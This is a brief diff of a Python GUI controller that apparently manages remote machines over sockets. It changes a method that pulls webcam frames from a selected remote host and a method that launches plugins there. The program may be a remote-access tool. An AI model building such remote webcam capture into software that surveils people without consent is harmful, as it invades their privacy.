@@ -319,8 +319,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def get_webcam_preview(self):
         server = self.current_server()
         if server:
+            webcam_dict = get(self.socks[server]['sock'], 'getWebcam', 'webcamera')
             try:
-                webcam_dict = get(self.socks[server]['sock'], 'getWebcam', 'webcamera')
                 webcam_info = ast.literal_eval(webcam_dict)
                 im = Image.fromstring('RGB', (int(webcam_info['width']), int(webcam_info['height'])),
                                       zlib.decompress(webcam_info['webcambits']), 'raw', 'BGR', 0, -1)
@@ -569,7 +569,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def run_plugin(self, mode):
         server = self.current_server()
         if server:
-            send(self.socks[server]['sock'], 'startChildSocket %s' % server, mode)
+            get(self.socks[server]['sock'], 'startChildSocket %s' % server, mode)
 
     def update_settings(self):
         self.settings = Config()
